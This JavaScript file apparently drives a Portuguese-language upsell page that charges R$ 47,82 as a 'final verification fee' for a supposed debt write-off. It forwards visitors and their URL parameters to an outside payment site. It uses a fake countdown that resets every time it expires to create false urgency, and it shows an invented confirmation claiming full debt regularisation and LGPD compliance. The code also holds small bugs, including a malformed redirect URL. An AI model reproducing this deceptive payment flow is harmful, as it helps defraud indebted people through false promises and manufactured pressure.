// Aguarda o DOM estar totalmente carregado
document.addEventListener('DOMContentLoaded', function() {
    
    // Elementos da página
    const payBtn = document.getElementById('payBtn');
    const hamburgerBtn = document.querySelector('.headerHamburguer');
    const verificationCard = document.querySelector('.verification-card');
    
    // Função para mostrar loading no botão
    function showLoading(button, text = 'Carregando...') {
        const originalText = button.textContent;
        button.textContent = text;
        button.disabled = true;
        button.style.opacity = '0.7';
        
        return function() {
            button.textContent = originalText;
            button.disabled = false;
            button.style.opacity = '1';
        };
    }
    
    // Função para mostrar notificação
    function showNotification(message, type = 'success') {
        const notification = document.createElement('div');
        notification.className = `notification notification--${type}`;
        notification.textContent = message;
        
        // Estilos da notificação
        let backgroundColor;
        switch(type) {
            case 'success':
                backgroundColor = '#4CAF50';
                break;
            case 'info':
                backgroundColor = '#2196F3';
                break;
            case 'warning':
                backgroundColor = '#ff9800';
                break;
            default:
                backgroundColor = '#f44336';
        }
        
        notification.style.cssText = `
            position: fixed;
            top: 20px;
            right: 20px;
            background: ${backgroundColor};
            color: white;
            padding: 1rem 1.5rem;
            border-radius: 10px;
            box-shadow: 0 4px 15px rgba(0,0,0,0.2);
            z-index: 1000;
            animation: slideInRight 0.3s ease-out;
            max-width: 300px;
            font-weight: 500;
        `;
        
        document.body.appendChild(notification);
        
        // Remove a notificação após 3 segundos
        setTimeout(() => {
            notification.style.animation = 'slideOutRight 0.3s ease-out';
            setTimeout(() => {
                if (notification.parentNode) {
                    notification.parentNode.removeChild(notification);
                }
            }, 300);
        }, 3000);
    }
    
    // Função para confirmar pagamento
    function confirmPayment() {
        const confirmModal = document.createElement('div');
        confirmModal.className = 'modal-overlay';
        confirmModal.innerHTML = `
            <div class="modal-content">
                <h3><i class="fas fa-shield-check"></i> Confirmar Verificação</h3>
                <p>Você está prestes a pagar <strong>R$ 47,82</strong> pela taxa de verificação final.</p>
                <p>Este valor garante a autenticação do seu atendimento e conclusão do processo.</p>
                <div class="modal-buttons">
                    <button class="btn btn-primary" id="confirmPayment">
                        <i class="fas fa-shield-check"></i> Confirmar
                    </button>
                    <button class="btn btn-secondary" id="cancelPayment">
                        <i class="fas fa-times"></i> Cancelar
                    </button>
                </div>
            </div>
        `;
        
        // Estilos do modal
        confirmModal.style.cssText = `
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0,0,0,0.7);
            display: flex;
            justify-content: center;
            align-items: center;
            z-index: 1000;
            animation: fadeIn 0.3s ease-out;
        `;
        
        const modalContent = confirmModal.querySelector('.modal-content');
        modalContent.style.cssText = `
            background: white;
            padding: 2rem;
            border-radius: 15px;
            max-width: 400px;
            width: 90%;
            text-align: center;
            box-shadow: 0 20px 40px rgba(0,0,0,0.3);
            animation: slideInUp 0.3s ease-out;
        `;
        
        const modalButtons = confirmModal.querySelector('.modal-buttons');
        modalButtons.style.cssText = `
            display: flex;
            gap: 1rem;
            margin-top: 1.5rem;
        `;
        
        document.body.appendChild(confirmModal);
        
        // Event listeners do modal
        document.getElementById('confirmPayment').addEventListener('click', function() {
            document.body.removeChild(confirmModal);
            processPayment();
        });
        
        document.getElementById('cancelPayment').addEventListener('click', function() {
            document.body.removeChild(confirmModal);
        });
        
        // Fecha o modal clicando fora dele
        confirmModal.addEventListener('click', function(e) {
            if (e.target === confirmModal) {
                document.body.removeChild(confirmModal);
            }
        });
    }
    
    // Função para processar pagamento
    function processPayment() {
        const stopLoading = showLoading(payBtn, 'Processando...');
        
        // Simula processamento de verificação
        setTimeout(() => {
            stopLoading();
            showNotification('Verificação processada com sucesso!', 'success');
            
            // Atualiza a interface após o pagamento
            setTimeout(() => {
                updateUIAfterPayment();
            }, 1000);
        }, 2000);
    }
    
    // Função para atualizar a interface após pagamento
    function updateUIAfterPayment() {
        verificationCard.innerHTML = `
            <div class="success-message">
                <i class="fas fa-check-circle" style="font-size: 4rem; color: #4CAF50; margin-bottom: 1rem;"></i>
                <h2>Verificação Confirmada!</h2>
                <p>Sua taxa de verificação final foi processada com sucesso.</p>
                <p>O processo de baixa de dívidas foi concluído.</p>
                <p><strong>Valor pago:</strong> R$ 47,82</p>
                <div class="transaction-info">
                    <p><strong>ID da Verificação:</strong> ${generateTransactionId()}</p>
                    <p><strong>Data:</strong> ${new Date().toLocaleDateString('pt-BR')}</p>
                    <p><strong>Status:</strong> <span style="color: #4CAF50;">Autenticado</span></p>
                </div>
                <ul class="success-garantias">
                    <li><i class="fas fa-check"></i> Comprovante emitido automaticamente</li>
                    <li><i class="fas fa-check"></i> Regularização total liberada</li>
                    <li><i class="fas fa-check"></i> Processo conforme LGPD</li>
                </ul>
                <button class="btn btn-primary" onclick="window.location.href='/'">
                    <i class="fas fa-home"></i> Voltar ao Início
                </button>
            </div>
        `;
        
        // Estilos para a mensagem de sucesso
        const successMessage = document.querySelector('.success-message');
        successMessage.style.cssText = `
            text-align: center;
            color: #333;
        `;
        
        const successSvg = successMessage.querySelector('svg');
        successSvg.style.cssText = `
            margin-bottom: 1rem;
            animation: bounce 0.6s ease-out;
        `;
        
        const transactionInfo = document.querySelector('.transaction-info');
        transactionInfo.style.cssText = `
            background: #f8f9fa;
            padding: 1rem;
            border-radius: 10px;
            margin: 1rem 0;
            border-left: 4px solid #4CAF50;
        `;
    }
    
    // Função para gerar ID de transação
    function generateTransactionId() {
        return 'TXN' + Date.now() + Math.random().toString(36).substr(2, 5).toUpperCase();
    }
    

    
    // Função para capturar e redirecionar com TODOS os parâmetros
    function redirectToCheckout(event) {
        event.preventDefault();

        // Captura TODOS os parâmetros da URL atual
        const urlParams = new URLSearchParams(window.location.search);
        const allParams = {};

        // Captura TODOS os parâmetros existentes na URL
        for (const [key, value] of urlParams.entries()) {
            allParams[key] = value;
        }

        // Adiciona parâmetros fixos da verificação
        allParams.from_upsell = 'verificacao_up1';
        allParams.valor = '4782';

        // Redireciona com os parâmetros
        const newParams = new URLSearchParams(allParams);
        window.location.href = "https://pay.seuacordobr.site/yOeXZKlpz41GAQa?from_upsell=verificacao_up1&valor=4782?" + newParams.toString();
    }

    // Event listeners
    payBtn.addEventListener('click', redirectToCheckout);
    

    
    // Animação de entrada da página
    setTimeout(() => {
        verificationCard.style.opacity = '1';
        verificationCard.style.transform = 'translateY(0)';
    }, 100);
    
    // Prevenção de clique duplo nos botões
    const buttons = document.querySelectorAll('.btn');
    buttons.forEach(button => {
        button.addEventListener('click', function() {
            if (this.disabled) return;
            
            this.style.transform = 'scale(0.95)';
            setTimeout(() => {
                this.style.transform = '';
            }, 150);
        });
    });
    
    // Validação de dados antes do pagamento
    function validatePaymentData() {
        // Aqui você pode adicionar validações específicas
        return true;
    }
    
    // Função para tracking de eventos (analytics)
    function trackEvent(eventName, data = {}) {
        console.log(`Evento: ${eventName}`, data);
        // Aqui você pode integrar com Google Analytics ou outras ferramentas
    }
    
    // Tracking de eventos
    payBtn.addEventListener('click', () => trackEvent('checkout_redirect'));
    
    // Adiciona estilos para animações
    const style = document.createElement('style');
    style.textContent = `
        @keyframes slideInRight {
            from { transform: translateX(100%); opacity: 0; }
            to { transform: translateX(0); opacity: 1; }
        }
        
        @keyframes slideOutRight {
            from { transform: translateX(0); opacity: 1; }
            to { transform: translateX(100%); opacity: 0; }
        }
        
        @keyframes fadeIn {
            from { opacity: 0; }
            to { opacity: 1; }
        }
        
        @keyframes slideInUp {
            from { transform: translateY(30px); opacity: 0; }
            to { transform: translateY(0); opacity: 1; }
        }
        
        @keyframes bounce {
            0%, 20%, 50%, 80%, 100% { transform: translateY(0); }
            40% { transform: translateY(-10px); }
            60% { transform: translateY(-5px); }
        }
        
        .notification--info {
            background: #2196F3 !important;
        }
    `;
    document.head.appendChild(style);
    
    // Função para gerenciar cookies
    function setCookie(name, value, hours) {
        const date = new Date();
        date.setTime(date.getTime() + (hours * 60 * 60 * 1000));
        const expires = "expires=" + date.toUTCString();
        document.cookie = name + "=" + value + ";" + expires + ";path=/";
    }
    
    function getCookie(name) {
        const nameEQ = name + "=";
        const ca = document.cookie.split(';');
        for (let i = 0; i < ca.length; i++) {
            let c = ca[i];
            while (c.charAt(0) === ' ') c = c.substring(1, c.length);
            if (c.indexOf(nameEQ) === 0) return c.substring(nameEQ.length, c.length);
        }
        return null;
    }
    
    function deleteCookie(name) {
        document.cookie = name + "=; expires=Thu, 01 Jan 1970 00:00:00 UTC; path=/;";
    }
    
    // Função para obter parâmetros da URL
    function getURLParameter(name) {
        const urlParams = new URLSearchParams(window.location.search);
        return urlParams.get(name);
    }
    
    // Função para personalizar mensagem com nome do usuário
    function personalizeMessage() {
        const processDescription = document.querySelector('.process-description p');
        const nomeSimplesParam = getURLParameter('nomesimples');
        
        if (nomeSimplesParam && processDescription) {
            const nome = nomeSimplesParam.charAt(0).toUpperCase() + nomeSimplesParam.slice(1).toLowerCase();
            processDescription.textContent = `${nome}, para dar continuidade ao processo e liberar sua regularização total, conclua a etapa de verificação abaixo:`;
        }
    }
    
    // Função para inicializar o temporizador de urgência
    function initializeUrgencyTimer() {
        const urgencyMessage = document.getElementById('urgencyMessage');
        const timeRemaining = document.getElementById('timeRemaining');
        
        // Calcula o tempo atual
        const now = new Date();
        
        // Verifica se já existe um cookie com o tempo de expiração
        const savedExpirationTime = getCookie('urgencyTimer');
        let expirationTime;
        
        if (savedExpirationTime) {
            expirationTime = new Date(parseInt(savedExpirationTime));
            // Verifica se o tempo salvo ainda é válido
            if (expirationTime <= now) {
                // Tempo expirado, cria um novo
                expirationTime = new Date(now.getTime() + (2 * 60 * 60 * 1000));
                setCookie('urgencyTimer', expirationTime.getTime().toString(), 24);
            }
        } else {
            // Calcula o tempo de expiração (2 horas a partir do momento de acesso)
            expirationTime = new Date(now.getTime() + (2 * 60 * 60 * 1000));
            setCookie('urgencyTimer', expirationTime.getTime().toString(), 24);
        }
        
        // Atualiza a mensagem de urgência com o horário limite
        const formattedTime = expirationTime.toLocaleTimeString('pt-BR', {
            hour: '2-digit',
            minute: '2-digit',
            hour12: false
        });
        
        urgencyMessage.innerHTML = `⏰ Essa verificação está disponível apenas até hoje às ${formattedTime}.`;
        
        // Função para atualizar o contador
        function updateCountdown() {
            const now = new Date();
            const timeLeft = expirationTime - now;
            
            if (timeLeft <= 0) {
                // Tempo expirado, reseta o timer para mais 2 horas
                const newExpirationTime = new Date(new Date().getTime() + (2 * 60 * 60 * 1000));
                setCookie('urgencyTimer', newExpirationTime.getTime().toString(), 24);
                
                // Atualiza a variável global
                expirationTime = newExpirationTime;
                
                // Atualiza a mensagem de urgência com o novo horário limite
                const newFormattedTime = newExpirationTime.toLocaleTimeString('pt-BR', {
                    hour: '2-digit',
                    minute: '2-digit',
                    hour12: false
                });
                
                urgencyMessage.innerHTML = `⏰ Essa verificação está disponível apenas até hoje às ${newFormattedTime}.`;
                
                // Mostra notificação de reset
                showNotification('⏰ Timer renovado! Você tem mais 2 horas para completar a verificação.', 'info');
                
                // Continua o temporizador sem parar
                return;
            }
            
            // Calcula horas, minutos e segundos restantes
            const hours = Math.floor(timeLeft / (1000 * 60 * 60));
            const minutes = Math.floor((timeLeft % (1000 * 60 * 60)) / (1000 * 60));
            const seconds = Math.floor((timeLeft % (1000 * 60)) / 1000);
            
            // Formata o tempo com zero à esquerda
            const formattedTime = [
                hours.toString().padStart(2, '0'),
                minutes.toString().padStart(2, '0'),
                seconds.toString().padStart(2, '0')
            ].join(':');
            
            timeRemaining.textContent = formattedTime;
            
            // Mudança de cor baseada no tempo restante
            if (timeLeft < 30 * 60 * 1000) { // Menos de 30 minutos
                timeRemaining.style.color = '#ff4444';
                timeRemaining.style.animation = 'blink 1s infinite';
            } else if (timeLeft < 60 * 60 * 1000) { // Menos de 1 hora
                timeRemaining.style.color = '#ff9800';
            } else {
                timeRemaining.style.color = '#ffeb3b';
            }
        }
        
        // Atualiza o contador imediatamente
        updateCountdown();
        
        // Atualiza a cada segundo
        const countdownInterval = setInterval(updateCountdown, 1000);
        
        // Adiciona estilo para o efeito de piscar
        const blinkStyle = document.createElement('style');
        blinkStyle.textContent = `
            @keyframes blink {
                0%, 50% { opacity: 1; }
                51%, 100% { opacity: 0.3; }
            }
        `;
        document.head.appendChild(blinkStyle);
    }
    
    // Personaliza a mensagem com nome do usuário se presente na URL
    personalizeMessage();
    
    // Inicializa o temporizador de urgência
    initializeUrgencyTimer();
    
    // Inicialização da página
    console.log('Página de upsell carregada com sucesso!');
    trackEvent('page_loaded');
}); 